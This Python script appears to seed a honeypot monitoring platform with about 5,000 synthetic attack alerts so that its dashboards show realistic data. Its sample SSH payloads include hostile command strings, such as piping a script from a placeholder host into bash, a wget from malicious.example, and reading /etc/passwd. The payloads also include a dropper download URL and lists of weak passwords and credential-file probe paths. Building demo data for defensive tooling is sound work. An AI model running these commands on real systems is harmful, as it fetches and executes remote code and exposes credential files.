"""Seed the HoneyPot MCP database with realistic demo attack data.

Run this against a fresh deployment (local or Docker) to populate dashboards
without waiting for real attack traffic.

    # Local
    uv run python scripts/seed_demo_data.py

    # Inside the docker-compose stack
    docker compose exec honeypot-mcp python scripts/seed_demo_data.py

What it does:

  - Creates representative honeypots (SSH, HTTP, SMTP, FTP, RDP) if absent.
  - Generates ~5000 Alert rows spread across the last 24 hours.
  - Distributes source IPs across realistic top attacker countries with
    plausible geo coordinates so the Grafana threat map lights up immediately.
  - Mixes severities and event types per engine to drive the severity stack
    and MITRE coverage panels.
  - Pre-populates `payload.enrichment.geoip` on every event so the Threat Map
    dashboard renders without an internet round-trip to MaxMind.

Idempotent: re-running clears prior demo data (alerts tagged `demo=True` in
their payload) before reseeding. Real honeypot traffic is left alone.
"""

from __future__ import annotations

import asyncio
import os
import random
import sys
from datetime import UTC, datetime, timedelta
from pathlib import Path

# Make the package importable when running the script directly from the
# repo root (no editable install). Inside the Docker image the package is
# already installed into the venv, so this is a no-op there.
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
_SRC = _PROJECT_ROOT / "src"
if _SRC.exists():
    sys.path.insert(0, str(_SRC))


# Realistic distribution of top attacker source countries — pulled loosely
# from public honeypot feeds (DShield, AbuseIPDB top-reporting). Each entry:
# (country_name, country_code, lat, lng, ip_prefix, weight).
# Weights are relative — higher = more events from that country.
_COUNTRIES: list[tuple[str, str, float, float, str, int]] = [
    ("China", "CN", 35.86, 104.20, "112.74", 30),
    ("Russia", "RU", 61.52, 105.32, "185.220", 22),
    ("United States", "US", 37.09, -95.71, "74.82", 18),
    ("Brazil", "BR", -14.24, -51.93, "177.107", 12),
    ("India", "IN", 20.59, 78.96, "117.247", 11),
    ("Germany", "DE", 51.17, 10.45, "78.46", 8),
    ("Vietnam", "VN", 14.06, 108.28, "115.78", 8),
    ("Netherlands", "NL", 52.13, 5.29, "194.169", 6),
    ("South Korea", "KR", 35.91, 127.77, "211.45", 6),
    ("Indonesia", "ID", -0.79, 113.92, "103.94", 5),
    ("Iran", "IR", 32.43, 53.69, "5.144", 5),
    ("Ukraine", "UA", 48.38, 31.17, "176.111", 4),
    ("Turkey", "TR", 38.96, 35.24, "78.180", 4),
    ("France", "FR", 46.23, 2.21, "92.222", 3),
    ("United Kingdom", "GB", 55.38, -3.44, "139.59", 3),
    ("Bulgaria", "BG", 42.73, 25.49, "78.130", 3),
    ("Romania", "RO", 45.94, 24.97, "92.114", 3),
    ("Mexico", "MX", 23.63, -102.55, "187.188", 2),
]

# Share of generated events per engine, roughly tracking what an internet-facing
# sensor actually sees: SSH and Telnet dominate (credential botnets), HTTP close
# behind, and the long tail of database/management surfaces gets scanned steadily
# but far less often.
#
# Every engine with an event profile appears here. The budget previously named
# only five, so twenty honeypots were created and fed nothing — the demo data
# that exists to show the platform off implied it covered five protocols, and
# the ATT&CK coverage dashboard rendered a fraction of the tactics it can detect.
# `_check_engine_mix` keeps the two in step.
_ENGINE_MIX: dict[str, float] = {
    "ssh": 0.30,
    "http": 0.15,
    "telnet": 0.08,
    "rdp": 0.08,
    "smb": 0.05,
    "smtp": 0.035,
    "ftp": 0.035,
    "mysql": 0.03,
    "vnc": 0.025,
    "redis": 0.025,
    "imap": 0.02,
    "sip": 0.02,
    "mssql": 0.02,
    "postgresql": 0.02,
    "elasticsearch": 0.02,
    "dns": 0.02,
    "mongodb": 0.015,
    "ldap": 0.015,
    "pop3": 0.015,
    "docker_api": 0.012,
    "kubernetes": 0.012,
    "memcached": 0.01,
    "snmp": 0.01,
    "rsync": 0.008,
    "nfs": 0.008,
}


# (event_type, severity, weight) per honeypot engine.
_EVENT_PROFILES: dict[str, list[tuple[str, str, int]]] = {
    "ssh": [
        ("ssh_login_failed", "medium", 50),
        ("ssh_session_connect", "low", 25),
        ("ssh_session_closed", "low", 20),
        ("ssh_login_success", "high", 4),
        ("ssh_command_input", "high", 8),
        ("ssh_client_version", "low", 15),
        ("ssh_file_download", "critical", 1),
        ("ssh_port_forward", "high", 2),
    ],
    "http": [
        ("http_request", "low", 40),
        ("http_404", "low", 30),
        ("http_login_attempt", "medium", 12),
        ("http_active_recon", "medium", 8),
        ("http_env_probe", "high", 5),
        ("http_admin_probe", "medium", 8),
        ("http_credential_attempt", "high", 3),
    ],
    "smtp": [
        ("smtp_ehlo", "low", 20),
        ("smtp_auth_attempt", "medium", 10),
        ("smtp_open_relay_probe", "high", 4),
        ("smtp_starttls", "low", 8),
    ],
    "ftp": [
        ("ftp_login_failed", "medium", 25),
        ("ftp_anonymous_login", "low", 10),
        ("ftp_file_op_blocked", "high", 3),
    ],
    "rdp": [
        ("rdp_handshake", "high", 20),
        ("rdp_invalid_probe", "low", 15),
    ],
    # The rest of the catalogue. Weights follow what a public IP actually
    # sees — brute force and scanning dominate, exploitation is rare — so the
    # dashboards show a believable distribution rather than an even split.
    "telnet": [
        ("telnet_login_failed", "medium", 60),
        ("telnet_session_connect", "low", 30),
        ("telnet_login_success", "high", 5),
        ("telnet_command_input", "high", 6),
        ("telnet_file_download", "critical", 2),
    ],
    "smb": [
        ("smb_connection", "low", 30),
        ("smb_negotiate", "low", 20),
        ("smb_session_setup", "high", 8),
        ("smb_exploit_attempt", "critical", 3),
    ],
    "vnc": [
        ("vnc_connection", "low", 20),
        ("vnc_handshake", "low", 12),
        ("vnc_auth_attempt", "high", 10),
    ],
    "mysql": [
        ("mysql_connection", "low", 20),
        ("mysql_login_attempt", "high", 15),
        ("mysql_recon_query", "medium", 5),
        ("mysql_outfile_write", "critical", 1),
    ],
    "postgresql": [
        ("postgresql_connection", "low", 20),
        ("postgresql_login_attempt", "high", 12),
        ("postgresql_copy_program_rce", "critical", 1),
    ],
    "mssql": [
        ("mssql_connection", "low", 18),
        ("mssql_login_attempt", "high", 12),
    ],
    "mongodb": [
        ("mongodb_connection", "low", 15),
        ("mongodb_command", "medium", 8),
        ("mongodb_destructive", "critical", 1),
        ("mongodb_ransom_note", "critical", 1),
    ],
    "redis": [
        ("redis_connection", "low", 20),
        ("redis_command", "medium", 12),
        ("redis_auth_attempt", "high", 8),
        ("redis_config_set", "critical", 2),
    ],
    "elasticsearch": [
        ("elasticsearch_recon_probe", "medium", 15),
        ("elasticsearch_query_probe", "medium", 8),
        ("elasticsearch_data_access", "high", 4),
    ],
    "dns": [
        ("dns_query", "low", 30),
        ("dns_any_query", "medium", 8),
        ("dns_version_probe", "medium", 5),
        ("dns_zone_transfer", "high", 2),
        ("dns_tunneling_suspected", "high", 1),
    ],
    "memcached": [
        ("memcached_connection", "low", 15),
        ("memcached_stats_probe", "medium", 12),
        ("memcached_amplification_attempt", "critical", 2),
    ],
    "snmp": [
        ("snmp_default_community", "high", 15),
        ("snmp_community_attempt", "medium", 20),
        ("snmp_bulk_request", "high", 4),
    ],
    "ldap": [
        ("ldap_connection", "low", 15),
        ("ldap_bind_attempt", "high", 12),
        ("ldap_search", "medium", 6),
        ("ldap_jndi_lookup", "critical", 2),
    ],
    "docker_api": [
        ("docker_api_recon", "medium", 12),
        ("docker_api_enumerate", "medium", 6),
        ("docker_api_image_pull", "critical", 2),
        ("docker_api_container_escape", "critical", 1),
    ],
    "kubernetes": [
        ("kubernetes_recon", "medium", 12),
        ("kubernetes_enumerate", "high", 6),
        ("kubernetes_secret_access", "critical", 2),
        ("kubernetes_pod_escape", "critical", 1),
    ],
    "imap": [
        ("imap_connection", "low", 20),
        ("imap_login_attempt", "high", 35),
        ("imap_capability_probe", "low", 10),
    ],
    "pop3": [
        ("pop3_connection", "low", 18),
        ("pop3_login_attempt", "high", 30),
    ],
    "sip": [
        ("sip_scan", "medium", 30),
        ("sip_extension_probe", "medium", 20),
        ("sip_register_attempt", "high", 10),
        ("sip_toll_fraud_attempt", "critical", 3),
    ],
    "rsync": [
        ("rsync_connection", "low", 12),
        ("rsync_module_enumeration", "high", 8),
        ("rsync_anonymous_access", "critical", 2),
    ],
    "nfs": [
        ("nfs_connection", "low", 12),
        ("nfs_export_enumeration", "high", 8),
        ("nfs_mount_attempt", "critical", 2),
    ],
}


def _check_engine_mix() -> None:
    """Fail loudly if the traffic mix and the event profiles disagree.

    An engine present in one and absent from the other is silent otherwise: a
    missing weight means a honeypot that never emits an event, and a missing
    profile means a KeyError only for whoever runs the seed next.
    """
    missing_weight = set(_EVENT_PROFILES) - set(_ENGINE_MIX)
    missing_profile = set(_ENGINE_MIX) - set(_EVENT_PROFILES)
    if missing_weight or missing_profile:
        raise SystemExit(
            "seed engine mix is out of step with the event profiles:\n"
            f"  no traffic weight: {sorted(missing_weight)}\n"
            f"  no event profile:  {sorted(missing_profile)}"
        )


_check_engine_mix()

_USERNAMES = [
    "root",
    "admin",
    "user",
    "ubuntu",
    "test",
    "postgres",
    "oracle",
    "git",
    "deploy",
    "ec2-user",
]
_PASSWORDS = [
    "123456",
    "admin",
    "password",
    "root",
    "qwerty",
    "letmein",
    "P@ssw0rd!",
    "changeme",
    "toor",
    "12345",
]
_SSH_BANNERS = [
    "SSH-2.0-libssh_0.9.6",
    "SSH-2.0-PUTTY",
    "SSH-2.0-Go",
    "SSH-2.0-paramiko_2.7.2",
    "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-JSCH-0.1.55",
]
_HTTP_PATHS = [
    "/admin",
    "/.env",
    "/.git/config",
    "/wp-login.php",
    "/phpmyadmin/",
    "/manager/html",
    "/api/v1/users",
    "/.aws/credentials",
    "/config.json",
    "/.docker/config.json",
    "/console/",
    "/server-status",
]


async def main() -> None:
    # Resolve the DB URL from env or default to the same file the server uses.
    # We don't import from honeypot_mcp.config here because seeding may run
    # before the server has initialised the settings singleton.
    db_url = os.environ.get(
        "DATABASE_URL",
        f"sqlite+aiosqlite:///{(_PROJECT_ROOT / 'honeypot_mcp.db').as_posix()}",
    )
    print(f"Seeding demo data into {db_url}")

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, get_session, init_db
    from honeypot_mcp.storage.models import (
        Alert,
        AlertSeverity,
        Honeypot,
        HoneypotStatus,
        HoneypotType,
    )

    os.environ["DATABASE_URL"] = db_url
    event_buffer.reset_for_tests()  # safe outside tests; clears any stale singleton
    await init_db()

    # ── Honeypots ────────────────────────────────────────────────────────────
    honeypot_specs = [
        ("demo-ssh", HoneypotType.SSH, 2222),
        ("demo-http", HoneypotType.HTTP, 8080),
        ("demo-smtp", HoneypotType.SMTP, 2525),
        ("demo-ftp", HoneypotType.FTP, 2121),
        ("demo-rdp", HoneypotType.RDP, 3389),
        ("demo-telnet", HoneypotType.TELNET, 2323),
        ("demo-smb", HoneypotType.SMB, 445),
        ("demo-vnc", HoneypotType.VNC, 5900),
        ("demo-mysql", HoneypotType.MYSQL, 3306),
        ("demo-postgresql", HoneypotType.POSTGRESQL, 5432),
        ("demo-mssql", HoneypotType.MSSQL, 1433),
        ("demo-mongodb", HoneypotType.MONGODB, 27017),
        ("demo-redis", HoneypotType.REDIS, 6379),
        ("demo-elasticsearch", HoneypotType.ELASTICSEARCH, 9200),
        ("demo-dns", HoneypotType.DNS, 5353),
        ("demo-memcached", HoneypotType.MEMCACHED, 11211),
        ("demo-snmp", HoneypotType.SNMP, 1161),
        ("demo-ldap", HoneypotType.LDAP, 1389),
        ("demo-docker-api", HoneypotType.DOCKER_API, 2375),
        ("demo-kubernetes", HoneypotType.KUBERNETES, 6443),
        ("demo-imap", HoneypotType.IMAP, 1143),
        ("demo-pop3", HoneypotType.POP3, 1110),
        ("demo-sip", HoneypotType.SIP, 5060),
        ("demo-rsync", HoneypotType.RSYNC, 8873),
        ("demo-nfs", HoneypotType.NFS, 2049),
    ]

    # Keyed by HoneypotType value, not display name: `docker_api` is deployed as
    # `demo-docker-api` because Docker object names disallow underscores, so
    # keying by name silently divorces the lookup from the engine identity that
    # `_EVENT_PROFILES` and `_ENGINE_MIX` both use.
    honeypot_ids: dict[str, int] = {}
    async with get_session() as session:
        from sqlalchemy import delete, select

        # Ensure demo honeypots exist (idempotent).
        for name, hp_type, port in honeypot_specs:
            existing = (
                await session.execute(select(Honeypot).where(Honeypot.name == name))
            ).scalar_one_or_none()
            if existing is None:
                hp = Honeypot(
                    name=name,
                    type=hp_type,
                    port=port,
                    status=HoneypotStatus.RUNNING,
                    config={"persona": "demo"},
                )
                session.add(hp)
                await session.flush()
                honeypot_ids[hp_type.value] = hp.id
            else:
                honeypot_ids[hp_type.value] = existing.id

        # Clear prior demo alerts so the script is idempotent. We match by
        # honeypot_id rather than payload contents because SQLite's JSON
        # containment operator is dialect-specific; demo honeypots are
        # named `demo-*` and never created outside this script, so deleting
        # their alerts is safe and never touches real attack data.
        await session.execute(
            delete(Alert).where(Alert.honeypot_id.in_(list(honeypot_ids.values())))
        )

    # ── Pre-build a pool of attacker IPs and their geo enrichment ────────────
    pool_size = 180
    attackers: list[tuple[str, dict]] = []
    for _ in range(pool_size):
        country = random.choices(_COUNTRIES, weights=[c[5] for c in _COUNTRIES], k=1)[0]
        name, code, lat, lng, prefix, _ = country
        ip = f"{prefix}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        # Jitter the coordinates so markers don't all stack on the country centroid.
        jitter_lat = lat + random.uniform(-2.0, 2.0)
        jitter_lng = lng + random.uniform(-2.0, 2.0)
        enrichment = {
            "geoip": {
                "country": name,
                "country_code": code,
                "latitude": round(jitter_lat, 4),
                "longitude": round(jitter_lng, 4),
                "available": True,
            },
            # Sprinkle reputation data on ~30% of attackers so the table cells
            # have content to compare against.
            "abuseipdb": (
                {
                    "available": True,
                    "abuse_confidence_score": random.randint(40, 100),
                    "total_reports": random.randint(5, 5000),
                }
                if random.random() < 0.3
                else {"available": False}
            ),
            # Keys must match what `intel.virustotal` really returns, or the
            # demo data exercises a shape no live lookup ever produces. This
            # said `malicious`, the same wrong key `digest_payload` read, so
            # the two agreed with each other and disagreed with reality.
            "virustotal": (
                {
                    "available": True,
                    "malicious_votes": (_vt_hits := random.randint(1, 25)),
                    "suspicious_votes": random.randint(0, 4),
                    "total_engines": 94,
                    "detection_ratio": f"{_vt_hits}/94",
                }
                if random.random() < 0.2
                else {"available": False}
            ),
        }
        attackers.append((ip, enrichment))

    # ── Generate event rows ──────────────────────────────────────────────────
    now = datetime.now(UTC)
    target_events = 5000
    events_per_engine = {
        engine: max(1, int(target_events * share)) for engine, share in _ENGINE_MIX.items()
    }

    print(f"Event budget across {len(events_per_engine)} engines, {target_events} events")

    alerts_to_insert: list[Alert] = []
    for engine, count in events_per_engine.items():
        profile = _EVENT_PROFILES[engine]
        event_choices = [(e[0], e[1]) for e in profile]
        event_weights = [e[2] for e in profile]
        hp_id = honeypot_ids[engine]

        for _ in range(count):
            event_type, severity_str = random.choices(event_choices, weights=event_weights, k=1)[0]
            attacker_ip, enrichment = random.choice(attackers)

            # Spread events across the last 24h, weighted toward more recent
            # times so the timeline panel shows a "current attack" vibe.
            hours_ago = random.triangular(0, 24, 4)
            ts = now - timedelta(hours=hours_ago, seconds=random.randint(0, 3599))

            payload = _build_payload(engine, event_type, attacker_ip)
            payload["demo"] = True
            # Pre-attach enrichment so the geo map works without VT/AbuseIPDB
            # round-trips on first dashboard load.
            payload["enrichment"] = enrichment

            alerts_to_insert.append(
                Alert(
                    honeypot_id=hp_id,
                    source_ip=attacker_ip,
                    source_port=random.randint(20000, 65000),
                    event_type=event_type,
                    payload=payload,
                    severity=AlertSeverity(severity_str),
                    acknowledged=False,
                    timestamp=ts,
                )
            )

    # Bulk insert in chunks. 1000-row chunks keep memory + SQL parameter
    # counts bounded; SQLAlchemy 2.x handles add_all + flush efficiently.
    chunk_size = 1000
    inserted = 0
    async with get_session() as session:
        for i in range(0, len(alerts_to_insert), chunk_size):
            session.add_all(alerts_to_insert[i : i + chunk_size])
            await session.flush()
            inserted += len(alerts_to_insert[i : i + chunk_size])
            print(f"  inserted {inserted}/{len(alerts_to_insert)}")

    print(f"\nDone. {inserted} demo alerts inserted across {len(honeypot_specs)} honeypots.")
    print("Open Grafana at http://localhost:3000 (admin / honeypot) to see the dashboards.")

    await close_db()


def _build_payload(engine: str, event_type: str, attacker_ip: str) -> dict:
    """Generate a believable per-event payload."""
    if engine == "ssh":
        if "login" in event_type:
            return {
                "username": random.choice(_USERNAMES),
                "password": random.choice(_PASSWORDS),
                "src_ip": attacker_ip,
            }
        if "command" in event_type:
            cmd = random.choice(
                [
                    "uname -a",
                    "cat /etc/passwd",
                    "wget http://malicious.example/payload.sh",
                    "curl -fsSL http://203.0.113.45/x.sh | bash",
                    "id",
                    "uptime",
                    "/bin/busybox echo gayfgt; /bin/busybox MIRAI",
                ]
            )
            return {"input": cmd, "src_ip": attacker_ip}
        if "version" in event_type:
            return {"version": random.choice(_SSH_BANNERS), "src_ip": attacker_ip}
        if "file_download" in event_type:
            return {
                "url": "http://203.0.113.45/x86_64.elf",
                "outfile": "/tmp/dropper",
                "src_ip": attacker_ip,
            }
        return {"src_ip": attacker_ip}

    if engine == "http":
        return {
            "path": random.choice(_HTTP_PATHS),
            "method": random.choice(["GET", "POST", "HEAD"]),
            "user_agent": random.choice(
                [
                    "Mozilla/5.0 (zgrab/0.x)",
                    "curl/7.68.0",
                    "python-requests/2.28.1",
                    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
                    "Mozilla/5.0 (Windows NT 10.0)",
                ]
            ),
            "src_ip": attacker_ip,
        }

    if engine == "smtp":
        return {
            "command": random.choice(["EHLO", "AUTH PLAIN ...", "MAIL FROM", "RCPT TO"]),
            "src_ip": attacker_ip,
        }

    if engine == "ftp":
        return {
            "username": random.choice(_USERNAMES + ["anonymous"]),
            "password": random.choice(_PASSWORDS),
            "src_ip": attacker_ip,
        }

    if engine == "rdp":
        return {
            "mstshash_cookie": f"{random.choice(_USERNAMES)}@CORP",
            "x224_class": random.choice([0, 1]),
            "src_ip": attacker_ip,
        }

    return {"src_ip": attacker_ip}


if __name__ == "__main__":
    asyncio.run(main())
